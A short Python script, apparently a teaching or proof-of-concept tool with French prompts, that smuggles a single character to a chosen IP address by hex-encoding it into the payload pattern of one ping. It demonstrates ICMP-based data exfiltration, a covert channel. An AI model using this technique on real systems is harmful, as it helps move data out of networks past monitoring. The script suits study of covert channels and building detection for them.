import subprocess
import sys


if len(sys.argv) != 3:
    print("Usage: python icmp_exfiltration_send_1.py <IP_destination> <caractère>")
    sys.exit(1)

destination_ip = sys.argv[1]
character = sys.argv[2]

if len(character) != 1:
    print("Veuillez entrer un seul caractère.")
    sys.exit(1)


binary_char = character.encode('utf-8').hex()


command = ['ping', destination_ip, '-c', '1', '-p', binary_char]
subprocess.run(command)

print(f"Caractère '{character}' envoyé à {destination_ip}.")
